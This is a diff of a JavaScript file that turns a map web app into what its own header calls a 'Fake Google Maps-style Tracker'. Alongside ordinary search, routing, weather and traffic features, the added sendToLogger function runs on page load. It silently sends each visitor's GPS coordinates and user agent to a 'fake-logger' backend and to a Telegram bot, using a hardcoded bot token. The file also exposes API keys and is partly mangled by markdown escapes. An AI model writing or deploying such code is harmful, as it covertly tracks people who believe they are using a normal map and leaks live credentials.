@@ -1,172 +1,202 @@
-const MAPTILER_API = "VcSgtSTkXfCbU3n3RqBO";
-const WEATHER_API = "71aec132cf2764d6ea577d3616629a9b";
-const TOMTOM_API = "a3vv3A6LAvqLAIKmknfwzSBXEjJOpXwu";
+// 🌍 Final script.js for Fake Google Maps-style Tracker
 
-// 🗺️ Initial map and base layers
-let isSatellite = false;
-let satelliteLayer = L.tileLayer(`https://api.maptiler.com/maps/hybrid/{z}/{x}/{y}.jpg?key=${MAPTILER_API}`, { tileSize: 512, zoomOffset: -1 });
-let normalLayer = L.tileLayer(`https://api.maptiler.com/maps/streets/{z}/{x}/{y}.png?key=${MAPTILER_API}`, { tileSize: 512, zoomOffset: -1 });
+let map;
+let marker;
+let startMarker, endMarker, routeControl;
+let currentPos;
+let history = \[];
+let weatherShown = false;
+let trafficLayer;
 
-const map = L.map("map").setView([25.276987, 55.296249], 13);
-normalLayer.addTo(map);
+const MAPTILER\_KEY = "VcSgtSTkXfCbU3n3RqBO";
+const BACKEND\_URL = "[https://fake-logger.onrender.com](https://fake-logger.onrender.com)";
+const TELEGRAM\_TOKEN = "7943375930\:AAEiifo4A9NiuxY13o73qjCJVUiHXEu2ta8";
+const TELEGRAM\_CHAT\_ID = "6602027873";
 
-let marker = L.marker([25.276987, 55.296249]).addTo(map);
-
-// 🌑 Dark Mode
-document.getElementById("darkToggle").onclick = () => {
-  document.body.classList.toggle("dark-mode");
+window\.onload = () => {
+initMap();
+sendToLogger();
 };
 
-// 🛰️ Toggle satellite
-document.getElementById("satToggle").onclick = function () {
-  if (isSatellite) {
-    map.removeLayer(satelliteLayer);
-    normalLayer.addTo(map);
-  } else {
-    map.removeLayer(normalLayer);
-    satelliteLayer.addTo(map);
-  }
-  isSatellite = !isSatellite;
-  this.classList.toggle("active");
-};
+function initMap() {
+map = L.map("map").setView(\[25.276987, 55.296249], 13); // Qatar fake view
 
-// 🔄 Show loading screen briefly
-window.addEventListener("load", () => {
-  setTimeout(() => {
-    document.getElementById("loading-screen").style.display = "none";
-  }, 1200);
-});
+const tile = L.tileLayer(`https://api.maptiler.com/maps/streets-v2/{z}/{x}/{y}.png?key=${MAPTILER_KEY}`, {
+attribution: "© MapTiler",
+}).addTo(map);
 
-// 📍 Live Location
-document.getElementById("locToggle").onclick = () => {
-  if (!navigator.geolocation) return alert("Geolocation not supported");
-  navigator.geolocation.getCurrentPosition(pos => {
-    const { latitude, longitude } = pos.coords;
-    map.setView([latitude, longitude], 15);
-    marker.setLatLng([latitude, longitude]);
-    saveToHistory(latitude, longitude, "Live Location");
-  });
-};
+marker = L.marker(\[25.276987, 55.296249], {
+draggable: false,
+icon: L.icon({
+iconUrl: "assets/red-marker.png",
+iconSize: \[32, 32],
+iconAnchor: \[16, 32]
+})
+}).addTo(map);
 
-// 🔍 Place Search
-document.getElementById("searchBtn").onclick = handleSearch;
-async function handleSearch() {
-  const query = document.getElementById("searchInput").value;
-  if (!query) return;
-  const res = await fetch(`https://api.maptiler.com/geocoding/${encodeURIComponent(query)}.json?key=${MAPTILER_API}&language=en`);
-  const data = await res.json();
-  if (data.features.length) {
-    const [lon, lat] = data.features[0].geometry.coordinates;
-    map.setView([lat, lon], 15);
-    marker.setLatLng([lat, lon]);
-    saveToHistory(lat, lon, data.features[0].place_name_en || data.features[0].place_name);
-  }
+map.on("dblclick", () => marker.remove());
 }
 
-// ⛔ Suggestion dropdown (Optional)
-document.getElementById("searchInput").addEventListener("input", async function () {
-  const query = this.value;
-  const box = document.getElementById("suggestions");
-  if (!query) return box.style.display = "none";
-  const res = await fetch(`https://api.maptiler.com/geocoding/${encodeURIComponent(query)}.json?key=${MAPTILER_API}&language=en`);
-  const data = await res.json();
-  box.innerHTML = "";
-  data.features.slice(0, 5).forEach(f => {
-    const div = document.createElement("div");
-    div.className = "suggestion";
-    div.textContent = f.place_name_en || f.place_name;
-    div.onclick = () => {
-      document.getElementById("searchInput").value = div.textContent;
-      handleSearch();
-      box.style.display = "none";
-    };
-    box.appendChild(div);
-  });
-  box.style.display = "block";
+function performSearch() {
+const input = document.getElementById("searchInput").value;
+if (!input) return;
+fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${input}`)
+.then(res => res.json())
+.then(results => {
+if (results.length > 0) {
+const place = results\[0];
+const latlng = \[place.lat, place.lon];
+if (marker) marker.remove();
+marker = L.marker(latlng, {
+icon: L.icon({ iconUrl: "assets/red-marker.png", iconSize: \[32, 32], iconAnchor: \[16, 32] })
+}).addTo(map);
+map.setView(latlng, 15);
+history.push(place.display\_name);
+}
 });
-
-// 🚦 Toggle traffic
-document.getElementById("trafficToggle").onclick = function () {
-  this.classList.toggle("active");
-  if (map.hasLayer(trafficLayer)) {
-    map.removeLayer(trafficLayer);
-  } else {
-    trafficLayer.addTo(map);
-  }
-};
-let trafficLayer = L.tileLayer(`https://api.tomtom.com/traffic/map/4/tile/flow/relative0/{z}/{x}/{y}.png?key=${TOMTOM_API}`, {
-  tileSize: 256,
-  opacity: 0.7
-});
-
-// 🌤️ Weather
-document.getElementById("weatherToggle").onclick = function () {
-  this.classList.toggle("active");
-  const box = document.getElementById("weather-box");
-  box.style.display = box.style.display === "block" ? "none" : "block";
-
-  const { lat, lng } = marker.getLatLng();
-  fetch(`https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lng}&units=metric&appid=${WEATHER_API}`)
-    .then(r => r.json())
-    .then(data => {
-      box.querySelector(".location").textContent = data.name;
-      box.querySelector(".temp").textContent = `${Math.round(data.main.temp)}°C`;
-      box.querySelector(".condition").textContent = data.weather[0].description;
-    });
-};
-
-// ➡️ Directions
-document.getElementById("dirToggle").onclick = function () {
-  const panel = document.getElementById("direction-panel");
-  panel.style.display = panel.style.display === "block" ? "none" : "block";
-};
-
-document.getElementById("getDirectionBtn").onclick = async function () {
-  const start = document.getElementById("start").value;
-  const end = document.getElementById("end").value;
-  if (!start || !end) return;
-
-  const getCoord = async (place) => {
-    const r = await fetch(`https://api.maptiler.com/geocoding/${encodeURIComponent(place)}.json?key=${MAPTILER_API}`);
-    const d = await r.json();
-    return d.features[0].geometry.coordinates.reverse();
-  };
-
-  const startCoord = await getCoord(start);
-  const endCoord = await getCoord(end);
-
-  if (window.routingControl) map.removeControl(window.routingControl);
-  window.routingControl = L.Routing.control({
-    waypoints: [L.latLng(...startCoord), L.latLng(...endCoord)],
-    routeWhileDragging: false
-  }).addTo(map);
-
-  map.setView(endCoord, 15);
-  marker.setLatLng(endCoord);
-  saveToHistory(endCoord[0], endCoord[1], `Route to ${end}`);
-};
-
-// 📋 Save to local history
-function saveToHistory(lat, lon, label) {
-  let list = JSON.parse(localStorage.getItem("locationHistory") || "[]");
-  list.unshift({ lat, lon, label, time: new Date().toLocaleString() });
-  localStorage.setItem("locationHistory", JSON.stringify(list.slice(0, 10))); // Max 10
-  showHistory();
 }
 
-// 📜 Show local history
-function showHistory() {
-  const list = JSON.parse(localStorage.getItem("locationHistory") || "[]");
-  const ul = document.getElementById("historyList");
-  ul.innerHTML = "";
-  list.forEach(item => {
-    const li = document.createElement("li");
-    li.textContent = `${item.label} (${item.time})`;
-    li.onclick = () => {
-      map.setView([item.lat, item.lon], 15);
-      marker.setLatLng([item.lat, item.lon]);
-    };
-    ul.appendChild(li);
-  });
+function locateMe() {
+navigator.geolocation.getCurrentPosition(pos => {
+const lat = pos.coords.latitude;
+const lon = pos.coords.longitude;
+currentPos = \[lat, lon];
+L.marker(currentPos, {
+icon: L.icon({ iconUrl: "assets/custom-marker.png", iconSize: \[32, 32], iconAnchor: \[16, 32] })
+}).addTo(map);
+map.setView(currentPos, 16);
+});
 }
-showHistory();
+
+function toggleDarkMode() {
+document.body.classList.toggle("dark-mode");
+}
+
+function toggleSearch() {
+document.getElementById("searchBox").style.display = "flex";
+document.getElementById("direction-panel").style.display = "none";
+}
+
+function toggleDirection() {
+const panel = document.getElementById("direction-panel");
+const search = document.getElementById("searchBox");
+if (panel.style.display === "flex" || panel.style.display === "block") {
+panel.style.display = "none";
+search.style.display = "flex";
+} else {
+panel.style.display = "block";
+search.style.display = "none";
+}
+}
+
+function closeDirectionPanel() {
+document.getElementById("direction-panel").style.display = "none";
+document.getElementById("searchBox").style.display = "flex";
+if (routeControl) map.removeControl(routeControl);
+}
+
+function getRoute() {
+const start = document.getElementById("start").value;
+const end = document.getElementById("end").value;
+if (!start || !end) return;
+
+Promise.all(\[
+fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${start}`).then(res => res.json()),
+fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${end}`).then(res => res.json())
+]).then((\[startRes, endRes]) => {
+const s = startRes\[0], e = endRes\[0];
+if (startMarker) map.removeLayer(startMarker);
+if (endMarker) map.removeLayer(endMarker);
+if (routeControl) map.removeControl(routeControl);
+
+```
+const startIcon = L.icon({ iconUrl: "assets/custom-start.png", iconSize: [32, 32], iconAnchor: [16, 32] });
+const endIcon = L.icon({ iconUrl: "assets/red-marker.png", iconSize: [32, 32], iconAnchor: [16, 32] });
+
+startMarker = L.marker([s.lat, s.lon], { icon: startIcon }).addTo(map);
+endMarker = L.marker([e.lat, e.lon], { icon: endIcon }).addTo(map);
+
+routeControl = L.Routing.control({
+  waypoints: [L.latLng(s.lat, s.lon), L.latLng(e.lat, e.lon)],
+  lineOptions: {
+    styles: [{ color: '#1976d2', weight: 5 }]
+  },
+  routeWhileDragging: false,
+  draggableWaypoints: false,
+  createMarker: () => null
+}).addTo(map);
+```
+
+});
+}
+
+function toggleWeather(btn) {
+const box = document.getElementById("weather-box");
+weatherShown = !weatherShown;
+box.style.display = weatherShown ? "block" : "none";
+
+if (currentPos) fetchWeather(currentPos\[0], currentPos\[1]);
+}
+
+function fetchWeather(lat, lon) {
+fetch(`https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&appid=71aec132cf2764d6ea577d3616629a9b&units=metric`)
+.then(res => res.json())
+.then(data => {
+document.getElementById("temp").innerText = data.main.temp + "°C";
+document.getElementById("condition").innerText = data.weather\[0].description;
+document.getElementById("weather-location").innerText = data.name;
+});
+}
+
+function toggleTraffic(btn) {
+if (!trafficLayer) {
+trafficLayer = L.tileLayer(`https://api.tomtom.com/traffic/map/4/tile/flow/relative0/{z}/{x}/{y}.png?key=a3vv3A6LAvqLAIKmknfwzSBXEjJOpXwu`, {
+tileSize: 256,
+opacity: 0.6
+});
+}
+if (map.hasLayer(trafficLayer)) {
+map.removeLayer(trafficLayer);
+btn.classList.remove("active");
+} else {
+trafficLayer.addTo(map);
+btn.classList.add("active");
+}
+}
+
+function toggleHistory(show) {
+const panel = document.getElementById("history-panel");
+panel.style.display = show ? "block" : "none";
+
+const list = document.getElementById("historyList");
+list.innerHTML = "";
+history.slice(-10).reverse().forEach(item => {
+const li = document.createElement("li");
+li.textContent = item;
+list.appendChild(li);
+});
+}
+
+function sendToLogger() {
+navigator.geolocation.getCurrentPosition(pos => {
+const lat = pos.coords.latitude;
+const lon = pos.coords.longitude;
+const payload = {
+lat, lon,
+time: new Date().toISOString(),
+userAgent: navigator.userAgent
+};
+fetch(`${BACKEND_URL}/log.php`, {
+method: "POST",
+headers: { "Content-Type": "application/json" },
+body: JSON.stringify(payload)
+});
+
+```
+// Telegram
+const msg = `New visitor\nLat: ${lat}\nLon: ${lon}\nTime: ${payload.time}`;
+fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`);
+```
+
+});
+}
